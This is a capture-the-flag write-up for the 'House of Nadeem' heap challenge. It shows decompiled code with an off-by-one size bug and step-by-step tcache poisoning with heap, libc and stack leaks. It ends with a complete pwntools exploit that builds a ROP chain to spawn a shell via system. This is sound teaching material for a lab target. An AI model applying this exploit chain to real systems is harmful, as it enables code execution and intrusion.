House of Nadeem was the last challenge that was released. As its name indicates, it is a heap exploitation challenge. It required understanding of glibc's ptmalloc implementation. Knowing internals of tcache is required and that is enough to complete the challenge.

### Analysis
We were provided a binary and after reversing, we get the following:
```C
int input(undefined8 msg,int lowLimit,int hiLimit)
{
  long in_FS_OFFSET;
  int intval;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("%s",msg);
  while( true ) {
    __isoc99_scanf("%d%*c",&intval);
    if (((lowLimit == 0) && (hiLimit == 0)) || ((lowLimit <= intval && (intval <= hiLimit)))) break;
    error("Invalid choice (Range: %d-%d). Try again: ",lowLimit,hiLimit);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return intval;
}

undefined8 main(void)
{
  undefined4 uVar1;
  int idx;
  int sz;
  void *ptr;
  long in_FS_OFFSET;
  void *chunks [8];
  size_t sizes [7];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  do {
    puts(" === House-of-Nadeem ===\n");
    puts("1. Allocate");
    puts("2. Free");
    puts("3. Read");
    puts("4. Write");
    puts("0. Exit\n");
    uVar1 = input("(Nadeem)$ ",0,0);
    switch(uVar1) {
    case 0:
      puts("See ya!");
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
      }
      return 0;
    case 1:
      idx = input("Index? ",0,7);
      sz = input("Size? ",1,0x100);
      ptr = malloc((long)sz);
      chunks[idx] = ptr;
      sizes[idx] = (long)(sz + 1);
      break;
    case 2:
      idx = input("Index? ",0,7);
      if (chunks[idx] == (void *)0x0) {
        error("Invalid index\n");
      }
      else {
        free(chunks[idx]);
        chunks[idx] = (void *)0x0;
        sizes[idx] = 0;
      }
      break;
    case 3:
      idx = input("Index? ",0,7);
      if (chunks[idx] == (void *)0x0) {
        error("Invalid index\n");
      }
      else {
        write(1,chunks[idx],sizes[idx]);
      }
      break;
    case 4:
      idx = input("Index? ",0,7);
      if (chunks[idx] == (void *)0x0) {
        error("Invalid index\n");
      }
      else {
        read(0,chunks[idx],sizes[idx]);
      }
      break;
    default:
      error("Invalid choice...\n");
    }
  } while( true );
}
```

The program presents us with a menu which is self-explanatory. We can allocate, free, read and write `malloc` chunks. We can utmost have 8 chunks at any given moment and the maximum size we can specify is `256` (0x100).

The program maintains two arrays. One for the chunk pointers and other for the sizes. The sizes are used when we read and write to the chunks. The read and write are done by functions `write` and `read` respectively.

The pointers are cleared after being freed, so on use-after-free. Looking closely at the allocation code, we see that the program adds `1` to the size we specified. This addition is only for the `sizes` array, not the chunk returned by `malloc`. This results in a one-byte buffer overflow.

The challenge was using latest libc and had Full RELRO, PIE, NX and canary enabled. This version of libc had tcache pointer mangling.

### Exploitation
Note: If you don't know any internals of ptmalloc, read the background knowledge of this [writeup](https://stdnoerr.github.io/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html).

The one-byte overflow allows us to corrupt the `size` in the chunks' metadata. This size is used by `free` to put the chunk into relevant bins. For example, when we free a chunk, `free` looks at its metadata to know what size the chunk actually has, assume it is `0x80` (not including the size of metadata). Then `free` puts the chunk in tcache bin for chunks of size `0x80`. Next time when a allocation of size `0x80` is requested the chunk in tcache bin is returned instead of making a new one.

But what if the size has been corrupted to be a larger value? That would result in the chunk being put to a bin of the larger size and returned for allocations of that size. Suppose the chunk we were talking about previously was actually of size `0x40` and we corrupted it to `0x80`. Now the new allocation will let us write `0x40` extra byes to the chunk.

This is what I did actually, I allocated three chunk of sizes `0x18`, `0x30` and `0x100` as `A`, `B` and `C` respectively. Used `A` to corrupt size of `B` to `0x81` (including the metadata and `PREV_INUSE` bit), this made `B` and `C` overlap, and then I freed `B`.

```python
A = alloc(0, 0x18)
B = alloc(1, 0x30)
C = alloc(2, 0x100)
D = alloc(6, 0x100) # More on this later

write(A, b'A'*0x18 + b'\x81')

free(B)
```

Then I re-allocated `B` as a chunk of size `0x70`. This will allow me to overflow into metadata of `C` and `0x30` bytes of `C`'s data. After re-allocation, `B` still had the mangled pointer. Since `B` had no next chunk, this was a pointer of heap base shift by `12` bits. I read the value and shifted it to the left by `12` bits to recover the pointer.

```python
B = alloc(B, 0x70)
read(B)

heap_base = u64(p.recv(8)) << 12
print(hex(heap_base))
```

Then I decided to do tcache poisoning to get `tcache_perthread_struct`. This would allow me to control what addresses are returned by tcache for `malloc` and how `free` will behave for tcache size chunks as well. For the poisoning attack, I freed `D` and `C` in order and used the overflow from `B` to overwrite `C`'s next pointer to point to `tcache_perthread_struct` (following the pointer mangling mechanism). Then allocated twice to claim the `tcache_perthread_struct`.
```python
free(D)
free(C)

write(B, b'A'*0x38 + p64(0x111) + p64((heap_base + 0x10) ^ (heap_base >> 12)))

C = alloc(C, 0x100)
tcache_perthread = alloc(3, 0x100)
```

Since the libc was latest, hooks were not gonna work. I decided to a similar approach to [[The Zoo]] and overwrite `main`'s return to write rop chain. For that I needed libc leak and stack leak.

For libc leak, I forced `C` to be put in unsorted bin by writing `7` to all tcache bins counters. Then I read the libc leak using `B`.
```python
write(tcache_perthread, b'\x07\x00'*64)

free(C)
read(B)

p.recv(0x38 + 8)
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x203b20

print(hex(libc.address))
```

For stack leak, I wrote `1` to all tcache bin counters and put address of `environ` to tcache bins heads. This will return `environ` by `malloc` that I can then read. But this didn't work because for some reason, `environ` had no pointer. It was `NULL`. Then I used `gef`'s `search libc stack` for finding stack pointers in libc and used one of them.
```python
write(tcache_perthread, b'\x01\x00'*64 + p64(libc.address + 0x2046e0)*16)

leak = alloc(4, 0x50)

read(leak)
stack_leak = u64(p.recv(8))
```

Then I used the same technique to get pointer at the return location of `main` to write rop chain. Because tcache pointers need to 16-byte aligned, I subtracted `8` to overwrite from the saved `rbp`. Then I wrote a simple `ret2libc` rop to run `system` and get shell.

```python
write(tcache_perthread, b'\x01\x00'*64 + p64(stack_leak - 296)*16)

rop = alloc(5, 0x50)

write(rop, b''.join([p64(x) for x in [
	0, # rbp
	libc.address + POP_RDI, libc.address + 0x1cb42f,
	libc.address + POP_RDI + 1,
	libc.sym.system]]))

sendchoice(0)
```

### Final Exploit
```python
#!/usr/bin/env python3
from pwn import *

def start() -> tube:
    if args.REMOTE:
        return remote("192.168.18.50", 33427)
    else:
        return elf.process()
    
def attach_gdb() -> None:
    if args.REMOTE or args.NOGDB:
        return
    
    gdb.attach(p, '''
    heap chunks
    heap bins
    continue
               ''')
    input("ATTACHED?")

def sendchoice(choice: int):
    p.sendlineafter("$ ", str(choice).encode())

def alloc(idx: int, size: int):
    sendchoice(1)

    p.sendlineafter("? ", str(idx).encode())
    p.sendlineafter("? ", str(size).encode())

    return idx

def free(idx: int):
    sendchoice(2)

    p.sendlineafter("? ", str(idx).encode())

def read(idx: int):
    sendchoice(3)

    p.sendlineafter("? ", str(idx).encode())    

def write(idx: int, payload: bytes):
    sendchoice(4)

    p.sendlineafter("? ", str(idx).encode())
    p.send(payload)

context.binary = elf = ELF("./house-of-nadeem_patched")
libc = elf.libc

POP_RDI = 0x000000000010f75b

p = start()

# Allocations
A = alloc(0, 0x18)
B = alloc(1, 0x30)
C = alloc(2, 0x100)
D = alloc(6, 0x100)

# Use one-byte overflow to overflow B and C
write(A, b'A'*0x18 + b'\x81')
free(B)

# Get overlapped chunk
B = alloc(B, 0x70)
read(B)

# Read mangled pointer
heap_base = u64(p.recv(8)) << 12

print(hex(heap_base))

# tcache poisoning to get tcache_perthread_struct
free(D)
free(C)

write(B, b'A'*0x38 + p64(0x111) + p64((heap_base + 0x10) ^ (heap_base >> 12)))

C = alloc(C, 0x100)

tcache_perthread = alloc(3, 0x100)

# Force C into unsorted bin
write(tcache_perthread, b'\x07\x00'*64)

free(C)
read(B)

# Read libc leak
p.recv(0x38 + 8)
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x203b20

print(hex(libc.address))

# Read stack leak from libc
write(tcache_perthread, b'\x01\x00'*64 + p64(libc.address + 0x2046e0)*16)

leak = alloc(4, 0x50)

read(leak)
stack_leak = u64(p.recv(8))

# Get pointer to main's return
write(tcache_perthread, b'\x01\x00'*64 + p64(stack_leak - 296)*16)

rop = alloc(5, 0x50)

write(rop, b''.join([p64(x) for x in [
    0, # rbp
    libc.address + POP_RDI, libc.address + 0x1cb42f,
    libc.address + POP_RDI + 1,
    libc.sym.system]]))

sendchoice(0)

p.interactive()
p.close()
```